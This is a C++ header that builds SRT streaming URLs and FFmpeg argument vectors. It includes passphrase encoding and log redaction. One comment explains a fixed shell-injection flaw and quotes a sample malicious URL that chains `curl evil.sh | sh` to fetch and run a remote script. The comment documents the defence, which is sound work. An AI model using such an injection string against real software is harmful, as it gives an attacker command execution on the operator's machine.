#pragma once

#include <algorithm>
#include <cctype>
#include <cmath>
#include <cstdio>
#include <sstream>
#include <string>
#include <vector>

namespace corevideo::modules {

// SRT DELIVERY over the FFmpeg transport, mirroring RtmpFfmpegArgs.h.
//
// WHY FFMPEG AND NOT libsrt DIRECTLY: the RTMP sender already owns a hardened
// process/pipe pipeline — wallclock pacing, NV12 feeding, reconnect/backoff,
// health reporting — and the staged FFmpeg on this rig is built WITH libsrt
// (`--enable-libsrt`; `ffmpeg -protocols` lists srt for both input and output).
// Linking libsrt into the core would duplicate all of that machinery and add a
// native dependency for transport FFmpeg already speaks. The container is
// MPEG-TS, which is what SRT carries in practice (FLV is RTMP's container and
// has no place here).
//
// The passphrase lands on the FFmpeg command line, exactly as the RTMP stream
// key already does. That is visible in a process listing, so `redactedSrtUrl`
// exists for every log/snapshot path — never emit the raw URL.

struct SrtEndpointConfig {
  std::string host;
  int port = 0;
  std::string mode = "caller";  // caller | listener | rendezvous
  // SRT latency is a MICROSECOND option in FFmpeg's libsrt wrapper. Callers hold
  // it as ms in the UI; whichever is set wins, µs taking precedence.
  int latencyMs = 0;
  int latencyUs = 0;
  std::string passphrase;
  int keyLength = 0;  // pbkeylen: 16 | 24 | 32, only meaningful with a passphrase
  std::string streamId;
};

struct SrtEndpointResult {
  bool valid = false;
  std::string url;
  std::string error;
};

// Percent-encode everything outside the unreserved set. A passphrase or streamid
// may legitimately contain '&', '?' or '=' , which would otherwise silently
// truncate the query and produce a stream that connects unencrypted or under the
// wrong id.
inline std::string percentEncodeSrtValue(const std::string& value) {
  static const char* kHex = "0123456789ABCDEF";
  std::string out;
  out.reserve(value.size());
  for (const unsigned char ch : value) {
    const bool unreserved = (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') ||
                            (ch >= '0' && ch <= '9') || ch == '-' || ch == '.' || ch == '_' || ch == '~';
    if (unreserved) {
      out.push_back(static_cast<char>(ch));
    } else {
      out.push_back('%');
      out.push_back(kHex[(ch >> 4) & 0x0F]);
      out.push_back(kHex[ch & 0x0F]);
    }
  }
  return out;
}

inline bool isValidSrtMode(const std::string& mode) {
  return mode == "caller" || mode == "listener" || mode == "rendezvous";
}

// Build the srt:// URL. Returns valid=false with a human-readable reason rather
// than emitting a half-formed URL — a malformed endpoint fails at FFmpeg spawn
// time with a far less useful message.
inline SrtEndpointResult buildSrtUrl(const SrtEndpointConfig& config) {
  SrtEndpointResult result;
  std::string host = config.host;
  // Tolerate a pasted "srt://host:port" in the host field.
  const std::string scheme = "srt://";
  if (host.rfind(scheme, 0) == 0) {
    host = host.substr(scheme.size());
  }
  int port = config.port;
  if (const auto colon = host.rfind(':'); colon != std::string::npos && host.find(']') == std::string::npos) {
    const std::string tail = host.substr(colon + 1);
    if (!tail.empty() && std::all_of(tail.begin(), tail.end(), [](unsigned char c) { return std::isdigit(c); })) {
      if (port == 0) {
        port = std::atoi(tail.c_str());
      }
      host = host.substr(0, colon);
    }
  }
  if (host.empty()) {
    result.error = "SRT destination needs a host.";
    return result;
  }
  if (port <= 0 || port > 65535) {
    result.error = "SRT destination needs a port between 1 and 65535.";
    return result;
  }
  const std::string mode = config.mode.empty() ? std::string("caller") : config.mode;
  if (!isValidSrtMode(mode)) {
    result.error = "SRT mode must be caller, listener or rendezvous (got '" + mode + "').";
    return result;
  }
  if (!config.passphrase.empty() && config.passphrase.size() < 10) {
    // libsrt rejects shorter passphrases at connect time; catching it here turns a
    // mid-show failed handshake into a configuration error.
    result.error = "SRT passphrase must be at least 10 characters.";
    return result;
  }

  const int latencyUs = config.latencyUs > 0
                            ? config.latencyUs
                            : (config.latencyMs > 0 ? config.latencyMs * 1000 : 120000);

  std::ostringstream url;
  url << "srt://" << host << ":" << port << "?mode=" << mode << "&transtype=live"
      << "&latency=" << latencyUs;
  if (!config.passphrase.empty()) {
    url << "&passphrase=" << percentEncodeSrtValue(config.passphrase);
    int keyLength = config.keyLength;
    if (keyLength != 16 && keyLength != 24 && keyLength != 32) {
      keyLength = 16;  // libsrt's own default; an invalid value would be rejected
    }
    url << "&pbkeylen=" << keyLength;
  }
  if (!config.streamId.empty()) {
    url << "&streamid=" << percentEncodeSrtValue(config.streamId);
  }
  result.url = url.str();
  result.valid = true;
  return result;
}

// Never log or snapshot the raw URL: the passphrase rides in the query string.
inline std::string redactedSrtUrl(const std::string& url) {
  const std::string needle = "passphrase=";
  const auto start = url.find(needle);
  if (start == std::string::npos) {
    return url;
  }
  const auto valueStart = start + needle.size();
  const auto valueEnd = url.find('&', valueStart);
  std::string redacted = url.substr(0, valueStart) + "***";
  if (valueEnd != std::string::npos) {
    redacted += url.substr(valueEnd);
  }
  return redacted;
}

// Build the FFmpeg ARGV that decodes one SRT source into raw BGRA on stdout.
// Output is forced to a fixed size so the reader can consume whole frames without
// negotiating format mid-stream; whatever resolution the contributor sends is
// scaled to the source's configured geometry.
//
// SECURITY: this returns an argv VECTOR, never a shell string. The previous
// version interpolated the SRT url into one command line and ran it through
// `/bin/sh -c`, which is arbitrary command execution: the url is built from
// operator-entered host/port/streamId/passphrase, and buildSrtUrl deliberately
// "tolerates a pasted srt://host:port" because pasting a remote contributor's
// connection string IS the workflow. A guest supplying
//   srt://h:9000" ; curl evil.sh | sh ; "
// would have run as the operator. Nothing validated metacharacters. Passing
// argv straight to execvp removes the shell from the path entirely, so a url
// can only ever be one ffmpeg argument no matter what it contains.
// `audioSink`, when set, adds a SECOND output carrying the feed's embedded audio
// as f32le 48k stereo. A contribution feed carries its guest's audio inside the
// same transport with no OS device to pair it with, so it cannot ride the WASAPI
// capture-audio path; the caller passes a pipe/FIFO it is already reading.
inline std::vector<std::string> buildSrtIngestArgv(const std::string& executable,
                                                   const std::string& url,
                                                   int width, int height, int frameRate,
                                                   const std::string& audioSink = std::string()) {
  std::vector<std::string> argv{
      executable,
      "-hide_banner", "-loglevel", "error",
      // Contribution feeds are live: do not buffer ahead of real time.
      "-fflags", "nobuffer", "-flags", "low_delay",
  };
  if (!audioSink.empty()) {
    // -y IS LOAD-BEARING. The audio sink already exists (we create the pipe before
    // spawning), and FFmpeg treats an existing output path as a file to confirm:
    // it prompts "Overwrite? [y/N]" and EXITS when nothing answers — killing the
    // decoder and taking VIDEO down with it. -nostdin keeps it off our stdin.
    argv.push_back("-y");
    argv.push_back("-nostdin");
  }
  argv.push_back("-i");
  argv.push_back(url);
  if (!audioSink.empty()) {
    // With two outputs each needs its own stream mapping.
    argv.push_back("-map");
    argv.push_back("0:v:0");
  }
  argv.push_back("-an");
  argv.insert(argv.end(), {"-f", "rawvideo", "-pix_fmt", "bgra",
                           "-s", std::to_string(width) + "x" + std::to_string(height),
                           "-r", std::to_string(frameRate),
                           "pipe:1"});
  if (!audioSink.empty()) {
    // "0:a:0?" — the ? makes the mapping OPTIONAL, so a video-only contributor
    // still decodes instead of failing the whole process.
    argv.insert(argv.end(), {"-map", "0:a:0?", "-vn",
                             "-f", "f32le", "-ar", "48000", "-ac", "2"});
    argv.push_back(audioSink);
  }
  return argv;
}


}  // namespace corevideo::modules
